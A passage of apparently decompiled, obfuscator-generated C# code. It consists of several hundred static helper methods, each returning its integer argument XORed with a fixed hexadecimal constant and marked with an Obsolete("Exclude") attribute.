		return int_4 ^ 0x46F05A26;
	}

	[Obsolete("Exclude")]
	public static int smethod_2827(int int_4)
	{
		return int_4 ^ 0x8B28E9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2828(int int_4)
	{
		return int_4 ^ 0x54A6518D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2829(int int_4)
	{
		return int_4 ^ 0x5A3A7C84;
	}

	[Obsolete("Exclude")]
	public static int smethod_2830(int int_4)
	{
		return int_4 ^ 0x4A14DA41;
	}

	[Obsolete("Exclude")]
	public static int smethod_2831(int int_4)
	{
		return int_4 ^ 0x6FAD868C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2832(int int_4)
	{
		return int_4 ^ 0x13DE227;
	}

	[Obsolete("Exclude")]
	public static int smethod_2833(int int_4)
	{
		return int_4 ^ 0x4BEBAEAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2834(int int_4)
	{
		return int_4 ^ 0x3F12CAB3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2835(int int_4)
	{
		return int_4 ^ 0x7B4766FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2836(int int_4)
	{
		return int_4 ^ 0x19B9CF4A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2837(int int_4)
	{
		return int_4 ^ 0x70492549;
	}

	[Obsolete("Exclude")]
	public static int smethod_2838(int int_4)
	{
		return int_4 ^ 0x172E9E6F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2839(int int_4)
	{
		return int_4 ^ 0x6ECD6566;
	}

	[Obsolete("Exclude")]
	public static int smethod_2840(int int_4)
	{
		return int_4 ^ 0xD05F3A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2841(int int_4)
	{
		return int_4 ^ 0x342B3E51;
	}

	[Obsolete("Exclude")]
	public static int smethod_2842(int int_4)
	{
		return int_4 ^ 0xB942C25;
	}

	[Obsolete("Exclude")]
	public static int smethod_2843(int int_4)
	{
		return int_4 ^ 0x163AC222;
	}

	[Obsolete("Exclude")]
	public static int smethod_2844(int int_4)
	{
		return int_4 ^ 0xDE83E97;
	}

	[Obsolete("Exclude")]
	public static int smethod_2845(int int_4)
	{
		return int_4 ^ 0x60FCCD7E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2846(int int_4)
	{
		return int_4 ^ 0x35AF80A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2847(int int_4)
	{
		return int_4 ^ 0x1E4574BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2848(int int_4)
	{
		return int_4 ^ 0x7C86561;
	}

	[Obsolete("Exclude")]
	public static int smethod_2849(int int_4)
	{
		return int_4 ^ 0x3E470FDC;
	}

	[Obsolete("Exclude")]
	public static int smethod_2850(int int_4)
	{
		return int_4 ^ 0x72991752;
	}

	[Obsolete("Exclude")]
	public static int smethod_2851(int int_4)
	{
		return int_4 ^ 0x977C835;
	}

	[Obsolete("Exclude")]
	public static int smethod_2852(int int_4)
	{
		return int_4 ^ 0x44FD15CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2853(int int_4)
	{
		return int_4 ^ 0x6792B4EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2854(int int_4)
	{
		return int_4 ^ 0x6E274863;
	}

	[Obsolete("Exclude")]
	public static int smethod_2855(int int_4)
	{
		return int_4 ^ 0x48C2CA5E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2856(int int_4)
	{
		return int_4 ^ 0x9A46748;
	}

	[Obsolete("Exclude")]
	public static int smethod_2857(int int_4)
	{
		return int_4 ^ 0x7FF9A494;
	}

	[Obsolete("Exclude")]
	public static int smethod_2858(int int_4)
	{
		return int_4 ^ 0x67339F71;
	}

	[Obsolete("Exclude")]
	public static int smethod_2859(int int_4)
	{
		return int_4 ^ 0x4D6B0A75;
	}

	[Obsolete("Exclude")]
	public static int smethod_2860(int int_4)
	{
		return int_4 ^ 0x2FBCE110;
	}

	[Obsolete("Exclude")]
	public static int smethod_2861(int int_4)
	{
		return int_4 ^ 0x66F66DC3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2862(int int_4)
	{
		return int_4 ^ 0x3A487747;
	}

	[Obsolete("Exclude")]
	public static int smethod_2863(int int_4)
	{
		return int_4 ^ 0x6E895616;
	}

	[Obsolete("Exclude")]
	public static int smethod_2864(int int_4)
	{
		return int_4 ^ 0x7F277561;
	}

	[Obsolete("Exclude")]
	public static int smethod_2865(int int_4)
	{
		return int_4 ^ 0x7EEB793D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2866(int int_4)
	{
		return int_4 ^ 0x66F6636B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2867(int int_4)
	{
		return int_4 ^ 0x40059849;
	}

	[Obsolete("Exclude")]
	public static int smethod_2868(int int_4)
	{
		return int_4 ^ 0x29790201;
	}

	[Obsolete("Exclude")]
	public static int smethod_2869(int int_4)
	{
		return int_4 ^ 0xBF4FC18;
	}

	[Obsolete("Exclude")]
	public static int smethod_2870(int int_4)
	{
		return int_4 ^ 0x644F5A45;
	}

	[Obsolete("Exclude")]
	public static int smethod_2871(int int_4)
	{
		return int_4 ^ 0x17FE549E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2872(int int_4)
	{
		return int_4 ^ 0x4041422F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2873(int int_4)
	{
		return int_4 ^ 0x785EE37E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2874(int int_4)
	{
		return int_4 ^ 0x14BB2B57;
	}

	[Obsolete("Exclude")]
	public static int smethod_2875(int int_4)
	{
		return int_4 ^ 0x3D274D3A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2876(int int_4)
	{
		return int_4 ^ 0x4EDA72F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2877(int int_4)
	{
		return int_4 ^ 0x7FF8A323;
	}

	[Obsolete("Exclude")]
	public static int smethod_2878(int int_4)
	{
		return int_4 ^ 0x41842EA7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2879(int int_4)
	{
		return int_4 ^ 0x639252FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2880(int int_4)
	{
		return int_4 ^ 0x846BEDF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2881(int int_4)
	{
		return int_4 ^ 0x1D406189;
	}

	[Obsolete("Exclude")]
	public static int smethod_2882(int int_4)
	{
		return int_4 ^ 0x3747F78;
	}

	[Obsolete("Exclude")]
	public static int smethod_2883(int int_4)
	{
		return int_4 ^ 0x5A86BE88;
	}

	[Obsolete("Exclude")]
	public static int smethod_2884(int int_4)
	{
		return int_4 ^ 0x7B1B7D3B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2885(int int_4)
	{
		return int_4 ^ 0x6D7025E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2886(int int_4)
	{
		return int_4 ^ 0x3EA1464E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2887(int int_4)
	{
		return int_4 ^ 0xA0432B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2888(int int_4)
	{
		return int_4 ^ 0x644129AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2889(int int_4)
	{
		return int_4 ^ 0x2C45042F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2890(int int_4)
	{
		return int_4 ^ 0x6867A0C7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2891(int int_4)
	{
		return int_4 ^ 0x2E85BCB1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2892(int int_4)
	{
		return int_4 ^ 0x345A8990;
	}

	[Obsolete("Exclude")]
	public static int smethod_2893(int int_4)
	{
		return int_4 ^ 0x79A32BD4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2894(int int_4)
	{
		return int_4 ^ 0x45514E4A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2895(int int_4)
	{
		return int_4 ^ 0x2DB2E736;
	}

	[Obsolete("Exclude")]
	public static int smethod_2896(int int_4)
	{
		return int_4 ^ 0x2931B10B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2897(int int_4)
	{
		return int_4 ^ 0x31023F97;
	}

	[Obsolete("Exclude")]
	public static int smethod_2898(int int_4)
	{
		return int_4 ^ 0x175C02AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2899(int int_4)
	{
		return int_4 ^ 0x354706D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2900(int int_4)
	{
		return int_4 ^ 0x71624548;
	}

	[Obsolete("Exclude")]
	public static int smethod_2901(int int_4)
	{
		return int_4 ^ 0x5BB589D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2902(int int_4)
	{
		return int_4 ^ 0x6B984852;
	}

	[Obsolete("Exclude")]
	public static int smethod_2903(int int_4)
	{
		return int_4 ^ 0x75A70F53;
	}

	[Obsolete("Exclude")]
	public static int smethod_2904(int int_4)
	{
		return int_4 ^ 0x623F376C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2905(int int_4)
	{
		return int_4 ^ 0x135AA7D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2906(int int_4)
	{
		return int_4 ^ 0x29BF4D9A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2907(int int_4)
	{
		return int_4 ^ 0x36757508;
	}

	[Obsolete("Exclude")]
	public static int smethod_2908(int int_4)
	{
		return int_4 ^ 0x2DACDF1F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2909(int int_4)
	{
		return int_4 ^ 0x38726B60;
	}

	[Obsolete("Exclude")]
	public static int smethod_2910(int int_4)
	{
		return int_4 ^ 0xE5D7DB4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2911(int int_4)
	{
		return int_4 ^ 0x60E46300;
	}

	[Obsolete("Exclude")]
	public static int smethod_2912(int int_4)
	{
		return int_4 ^ 0x5CBF8E6F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2913(int int_4)
	{
		return int_4 ^ 0x25F6AD1D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2914(int int_4)
	{
		return int_4 ^ 0x697DE66B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2915(int int_4)
	{
		return int_4 ^ 0x2A003AF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2916(int int_4)
	{
		return int_4 ^ 0x2508641D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2917(int int_4)
	{
		return int_4 ^ 0x468EB63B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2918(int int_4)
	{
		return int_4 ^ 0x3288BC02;
	}

	[Obsolete("Exclude")]
	public static int smethod_2919(int int_4)
	{
		return int_4 ^ 0x3710EA4E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2920(int int_4)
	{
		return int_4 ^ 0x5046260F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2921(int int_4)
	{
		return int_4 ^ 0x243A24F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2922(int int_4)
	{
		return int_4 ^ 0x289344B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2923(int int_4)
	{
		return int_4 ^ 0x4F7B6D87;
	}

	[Obsolete("Exclude")]
	public static int smethod_2924(int int_4)
	{
		return int_4 ^ 0x13B435B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2925(int int_4)
	{
		return int_4 ^ 0x1E81D764;
	}

	[Obsolete("Exclude")]
	public static int smethod_2926(int int_4)
	{
		return int_4 ^ 0x760F50B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2927(int int_4)
	{
		return int_4 ^ 0x373315D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2928(int int_4)
	{
		return int_4 ^ 0x75B86932;
	}

	[Obsolete("Exclude")]
	public static int smethod_2929(int int_4)
	{
		return int_4 ^ 0x5A97FFF6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2930(int int_4)
	{
		return int_4 ^ 0x4C380B4B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2931(int int_4)
	{
		return int_4 ^ 0xFFAC12E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2932(int int_4)
	{
		return int_4 ^ 0x4F2BC630;
	}

	[Obsolete("Exclude")]
	public static int smethod_2933(int int_4)
	{
		return int_4 ^ 0x62063544;
	}

	[Obsolete("Exclude")]
	public static int smethod_2934(int int_4)
	{
		return int_4 ^ 0x7F169611;
	}

	[Obsolete("Exclude")]
	public static int smethod_2935(int int_4)
	{
		return int_4 ^ 0x10602755;
	}

	[Obsolete("Exclude")]
	public static int smethod_2936(int int_4)
	{
		return int_4 ^ 0x72A5657B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2937(int int_4)
	{
		return int_4 ^ 0x57684C5B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2938(int int_4)
	{
		return int_4 ^ 0x4129E5D2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2939(int int_4)
	{
		return int_4 ^ 0x5700717A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2940(int int_4)
	{
		return int_4 ^ 0x14EE27B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2941(int int_4)
	{
		return int_4 ^ 0x75F1863;
	}

	[Obsolete("Exclude")]
	public static int smethod_2942(int int_4)
	{
		return int_4 ^ 0x2B44F849;
	}

	[Obsolete("Exclude")]
	public static int smethod_2943(int int_4)
	{
		return int_4 ^ 0x2C90BDE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2944(int int_4)
	{
		return int_4 ^ 0x18F3F028;
	}

	[Obsolete("Exclude")]
	public static int smethod_2945(int int_4)
	{
		return int_4 ^ 0x70C8BE06;
	}

	[Obsolete("Exclude")]
	public static int smethod_2946(int int_4)
	{
		return int_4 ^ 0x435C61B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2947(int int_4)
	{
		return int_4 ^ 0x6C8D6E27;
	}

	[Obsolete("Exclude")]
	public static int smethod_2948(int int_4)
	{
		return int_4 ^ 0x42269322;
	}

	[Obsolete("Exclude")]
	public static int smethod_2949(int int_4)
	{
		return int_4 ^ 0x5F3AF615;
	}

	[Obsolete("Exclude")]
	public static int smethod_2950(int int_4)
	{
		return int_4 ^ 0x6B60AA3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2951(int int_4)
	{
		return int_4 ^ 0x110CB6D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2952(int int_4)
	{
		return int_4 ^ 0x47831199;
	}

	[Obsolete("Exclude")]
	public static int smethod_2953(int int_4)
	{
		return int_4 ^ 0x66105772;
	}

	[Obsolete("Exclude")]
	public static int smethod_2954(int int_4)
	{
		return int_4 ^ 0x21A04D83;
	}

	[Obsolete("Exclude")]
	public static int smethod_2955(int int_4)
	{
		return int_4 ^ 0x6A53DF0B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2956(int int_4)
	{
		return int_4 ^ 0x44F49CB7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2957(int int_4)
	{
		return int_4 ^ 0x66F9B8C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2958(int int_4)
	{
		return int_4 ^ 0x2DB5CF76;
	}

	[Obsolete("Exclude")]
	public static int smethod_2959(int int_4)
	{
		return int_4 ^ 0x742C22F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2960(int int_4)
	{
		return int_4 ^ 0x5651EEB2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2961(int int_4)
	{
		return int_4 ^ 0x63F53B6D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2962(int int_4)
	{
		return int_4 ^ 0x356F6DD0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2963(int int_4)
	{
		return int_4 ^ 0x83857;
	}

	[Obsolete("Exclude")]
	public static int smethod_2964(int int_4)
	{
		return int_4 ^ 0x656AC169;
	}

	[Obsolete("Exclude")]
	public static int smethod_2965(int int_4)
	{
		return int_4 ^ 0x3E3A0C64;
	}

	[Obsolete("Exclude")]
	public static int smethod_2966(int int_4)
	{
		return int_4 ^ 0x57E2E245;
	}

	[Obsolete("Exclude")]
	public static int smethod_2967(int int_4)
	{
		return int_4 ^ 0x11E36B40;
	}

	[Obsolete("Exclude")]
	public static int smethod_2968(int int_4)
	{
		return int_4 ^ 0x77727EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2969(int int_4)
	{
		return int_4 ^ 0x691E41E8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2970(int int_4)
	{
		return int_4 ^ 0xD26A1F6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2971(int int_4)
	{
		return int_4 ^ 0x51DDCB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2972(int int_4)
	{
		return int_4 ^ 0x59C3F772;
	}

	[Obsolete("Exclude")]
	public static int smethod_2973(int int_4)
	{
		return int_4 ^ 0x165DC83;
	}

	[Obsolete("Exclude")]
	public static int smethod_2974(int int_4)
	{
		return int_4 ^ 0x20681659;
	}

	[Obsolete("Exclude")]
	public static int smethod_2975(int int_4)
	{
		return int_4 ^ 0x25CA6E53;
	}

	[Obsolete("Exclude")]
	public static int smethod_2976(int int_4)
	{
		return int_4 ^ 0x500DB740;
	}

	[Obsolete("Exclude")]
	public static int smethod_2977(int int_4)
	{
		return int_4 ^ 0x5892BA96;
	}

	[Obsolete("Exclude")]
	public static int smethod_2978(int int_4)
	{
		return int_4 ^ 0x25DF7714;
	}

	[Obsolete("Exclude")]
	public static int smethod_2979(int int_4)
	{
		return int_4 ^ 0x2553D7A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2980(int int_4)
	{
		return int_4 ^ 0x1644DFDE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2981(int int_4)
	{
		return int_4 ^ 0x5AB7DBAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2982(int int_4)
	{
		return int_4 ^ 0x71C47157;
	}

	[Obsolete("Exclude")]
	public static int smethod_2983(int int_4)
	{
		return int_4 ^ 0x221CDEFE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2984(int int_4)
	{
		return int_4 ^ 0x268F7582;
	}

	[Obsolete("Exclude")]
	public static int smethod_2985(int int_4)
	{
		return int_4 ^ 0x75CFB2BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2986(int int_4)
	{
		return int_4 ^ 0x2342C853;
	}

	[Obsolete("Exclude")]
	public static int smethod_2987(int int_4)
	{
		return int_4 ^ 0x7F58E841;
	}

	[Obsolete("Exclude")]
	public static int smethod_2988(int int_4)
	{
		return int_4 ^ 0x75A6AE6B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2989(int int_4)
	{
		return int_4 ^ 0x4DB4FACF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2990(int int_4)
	{
		return int_4 ^ 0x82E6F97;
	}

	[Obsolete("Exclude")]
	public static int smethod_2991(int int_4)
	{
		return int_4 ^ 0x39F2FDAA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2992(int int_4)
	{
		return int_4 ^ 0x1336010C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2993(int int_4)
	{
		return int_4 ^ 0x792EEA86;
	}

	[Obsolete("Exclude")]
	public static int smethod_2994(int int_4)
	{
		return int_4 ^ 0x1D7C50E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2995(int int_4)
	{
		return int_4 ^ 0x356C774F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2996(int int_4)
	{
		return int_4 ^ 0x55DA04A9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2997(int int_4)
	{
		return int_4 ^ 0x29E0057;
	}

	[Obsolete("Exclude")]
	public static int smethod_2998(int int_4)
	{
		return int_4 ^ 0x7F200CD5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2999(int int_4)
	{
		return int_4 ^ 0x20666FFF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3000(int int_4)
	{
		return int_4 ^ 0x71F92941;
	}

	[Obsolete("Exclude")]
	public static int smethod_3001(int int_4)
	{
		return int_4 ^ 0x37F47152;
	}

	[Obsolete("Exclude")]
	public static int smethod_3002(int int_4)
	{
		return int_4 ^ 0x14F3AB0F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3003(int int_4)
	{
		return int_4 ^ 0x408ACBB3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3004(int int_4)
	{
		return int_4 ^ 0x52DC2674;
	}

	[Obsolete("Exclude")]
	public static int smethod_3005(int int_4)
	{
		return int_4 ^ 0x22FF17E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3006(int int_4)
	{
		return int_4 ^ 0x6E35A835;
	}

	[Obsolete("Exclude")]
	public static int smethod_3007(int int_4)
	{
		return int_4 ^ 0xFE8B58A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3008(int int_4)
	{
		return int_4 ^ 0x690639FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3009(int int_4)
	{
		return int_4 ^ 0x438074BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3010(int int_4)
	{
		return int_4 ^ 0x1286747F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3011(int int_4)
	{
		return int_4 ^ 0x2A8DEDA4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3012(int int_4)
	{
		return int_4 ^ 0x7E8DAD7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3013(int int_4)
	{
		return int_4 ^ 0x2EC74BD3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3014(int int_4)
	{
		return int_4 ^ 0xF0E1476;
	}

	[Obsolete("Exclude")]
	public static int smethod_3015(int int_4)
	{
		return int_4 ^ 0x7FC98FCF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3016(int int_4)
	{
		return int_4 ^ 0x26B35D1B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3017(int int_4)
	{
		return int_4 ^ 0x403A3CF7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3018(int int_4)
	{
		return int_4 ^ 0x35494A8A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3019(int int_4)
	{
		return int_4 ^ 0x424B2317;
	}

	[Obsolete("Exclude")]
	public static int smethod_3020(int int_4)
	{
		return int_4 ^ 0x17466B23;
	}

	[Obsolete("Exclude")]
	public static int smethod_3021(int int_4)
	{
		return int_4 ^ 0x416BF303;
	}

	[Obsolete("Exclude")]
	public static int smethod_3022(int int_4)
	{
		return int_4 ^ 0x6D79A025;
	}

	[Obsolete("Exclude")]
	public static int smethod_3023(int int_4)
	{
		return int_4 ^ 0x7A0D9F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3024(int int_4)
	{
		return int_4 ^ 0x50E1C675;
	}

	[Obsolete("Exclude")]
	public static int smethod_3025(int int_4)
	{
		return int_4 ^ 0xC1F25AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3026(int int_4)
	{
		return int_4 ^ 0x13730E3D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3027(int int_4)
	{
		return int_4 ^ 0x257A5698;
	}

	[Obsolete("Exclude")]
	public static int smethod_3028(int int_4)
	{
		return int_4 ^ 0x4E24E828;
	}

	[Obsolete("Exclude")]
	public static int smethod_3029(int int_4)
	{
		return int_4 ^ 0x30F4A349;
	}

	[Obsolete("Exclude")]
	public static int smethod_3030(int int_4)
	{
		return int_4 ^ 0x139CE291;
	}

	[Obsolete("Exclude")]
	public static int smethod_3031(int int_4)
	{
		return int_4 ^ 0x3F22141D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3032(int int_4)
	{
		return int_4 ^ 0x36A1173;
	}

	[Obsolete("Exclude")]
	public static int smethod_3033(int int_4)
	{
		return int_4 ^ 0x22F54D40;
	}

	[Obsolete("Exclude")]
	public static int smethod_3034(int int_4)
	{
		return int_4 ^ 0x29170DB1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3035(int int_4)
	{
		return int_4 ^ 0x46125806;
	}

	[Obsolete("Exclude")]
	public static int smethod_3036(int int_4)
	{
		return int_4 ^ 0x50BB9958;
	}

	[Obsolete("Exclude")]
	public static int smethod_3037(int int_4)
	{
		return int_4 ^ 0x1A20D5B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3038(int int_4)
	{
		return int_4 ^ 0x4A05C94E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3039(int int_4)
	{
		return int_4 ^ 0x63BF950B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3040(int int_4)
	{
		return int_4 ^ 0x4D54B145;
	}

	[Obsolete("Exclude")]
	public static int smethod_3041(int int_4)
	{
		return int_4 ^ 0x1E4A1068;
	}

	[Obsolete("Exclude")]
	public static int smethod_3042(int int_4)
	{
		return int_4 ^ 0x54D85A80;
	}

	[Obsolete("Exclude")]
	public static int smethod_3043(int int_4)
	{
		return int_4 ^ 0x4F1B9BA4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3044(int int_4)
	{
		return int_4 ^ 0x63323D9F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3045(int int_4)
	{
		return int_4 ^ 0x1E731E0E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3046(int int_4)
	{
		return int_4 ^ 0x7104B95A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3047(int int_4)
	{
		return int_4 ^ 0x3F6872A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3048(int int_4)
	{
		return int_4 ^ 0x43C0FCA8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3049(int int_4)
	{
		return int_4 ^ 0x2A6B020A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3050(int int_4)
	{
		return int_4 ^ 0x7546E8CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3051(int int_4)
	{
		return int_4 ^ 0x4C0071B0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3052(int int_4)
	{
		return int_4 ^ 0x2B7065B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3053(int int_4)
	{
		return int_4 ^ 0x7E4AD2CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3054(int int_4)
	{
		return int_4 ^ 0x377FB57D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3055(int int_4)
	{
		return int_4 ^ 0x1CB9A942;
	}

	[Obsolete("Exclude")]
	public static int smethod_3056(int int_4)
	{
		return int_4 ^ 0x2781F42D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3057(int int_4)
	{
		return int_4 ^ 0x51C47F17;
	}

	[Obsolete("Exclude")]
	public static int smethod_3058(int int_4)
	{
		return int_4 ^ 0x74F41902;
	}

	[Obsolete("Exclude")]
	public static int smethod_3059(int int_4)
	{
		return int_4 ^ 0x7F245428;
	}

	[Obsolete("Exclude")]
	public static int smethod_3060(int int_4)
	{
		return int_4 ^ 0x7F70F6F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3061(int int_4)
	{
		return int_4 ^ 0x4723EF3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3062(int int_4)
	{
		return int_4 ^ 0x34AEFCF8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3063(int int_4)
	{
		return int_4 ^ 0x7E324FD1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3064(int int_4)
	{
		return int_4 ^ 0x26C9187F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3065(int int_4)
	{
		return int_4 ^ 0x3ADC8E3B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3066(int int_4)
	{
		return int_4 ^ 0x194336CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3067(int int_4)
	{
		return int_4 ^ 0x6E14D498;
	}

	[Obsolete("Exclude")]
	public static int smethod_3068(int int_4)
	{
		return int_4 ^ 0x7E5157A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3069(int int_4)
	{
		return int_4 ^ 0x4072BE36;
	}

	[Obsolete("Exclude")]
	public static int smethod_3070(int int_4)
	{
		return int_4 ^ 0x704F949B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3071(int int_4)
	{
		return int_4 ^ 0x7D00775B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3072(int int_4)
	{
		return int_4 ^ 0xF758887;
	}

	[Obsolete("Exclude")]
	public static int smethod_3073(int int_4)
	{
		return int_4 ^ 0x4B19BA61;
	}

	[Obsolete("Exclude")]
	public static int smethod_3074(int int_4)
	{
		return int_4 ^ 0x5A2467B0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3075(int int_4)
	{
		return int_4 ^ 0x21EB5381;
	}

	[Obsolete("Exclude")]
	public static int smethod_3076(int int_4)
	{
		return int_4 ^ 0x50640734;
	}

	[Obsolete("Exclude")]
	public static int smethod_3077(int int_4)
	{
		return int_4 ^ 0x644C6B07;
	}

	[Obsolete("Exclude")]
	public static int smethod_3078(int int_4)
	{
		return int_4 ^ 0x19AF5597;
	}

	[Obsolete("Exclude")]
	public static int smethod_3079(int int_4)
	{
		return int_4 ^ 0x439DE158;
	}

	[Obsolete("Exclude")]
	public static int smethod_3080(int int_4)
	{
		return int_4 ^ 0x28AC20F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3081(int int_4)
	{
		return int_4 ^ 0x74B431AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3082(int int_4)
	{
		return int_4 ^ 0xB816942;
	}

	[Obsolete("Exclude")]
	public static int smethod_3083(int int_4)
	{
		return int_4 ^ 0x473F9850;
	}

	[Obsolete("Exclude")]
	public static int smethod_3084(int int_4)
	{
		return int_4 ^ 0x4A8CBF06;
	}

	[Obsolete("Exclude")]
	public static int smethod_3085(int int_4)
	{
		return int_4 ^ 0x34C1FF4D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3086(int int_4)
	{
		return int_4 ^ 0x549FCA83;
	}

	[Obsolete("Exclude")]
	public static int smethod_3087(int int_4)
	{
		return int_4 ^ 0x54035C26;
	}

	[Obsolete("Exclude")]
	public static int smethod_3088(int int_4)
